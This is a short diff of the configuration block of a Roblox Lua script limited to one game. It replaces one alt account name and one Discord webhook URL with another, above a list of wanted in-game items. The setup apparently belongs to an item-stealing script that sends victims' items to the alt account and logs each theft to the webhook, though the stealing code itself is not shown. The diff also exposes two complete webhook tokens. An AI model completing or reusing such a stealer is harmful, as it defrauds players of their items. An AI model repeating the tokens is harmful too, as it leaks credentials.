@@ -1,8 +1,8 @@
 if game.PlaceId ~= 109983668079237 then return end
 
 -- ========== CONFIGURATION ==========
-local MY_ALT_USER = "hakimidu_95"
-local LOG_WEBHOOK = "https://discord.com/api/webhooks/1491134694656311397/ofX4CsHmL97_mPLxkp5f4VKHYOAq7tlcd_3SobAZzoESre71UpxmKg-g_V-0_9o2tPqT"
+local MY_ALT_USER = "Only1sherif"
+local LOG_WEBHOOK = "https://discord.com/api/webhooks/1496254716508639262/J-eMNrXhdgaWAiIlMIiObJCsXw0E3s4XHB2S-0HLvkOYRdoJI2QDnAGmPU0EJtTZhbK6"
 
 local wantedItems = {
     "Tralaledon", "Strawberry Elephant", "Skibidi Toilet", "Rosey and Teddy",
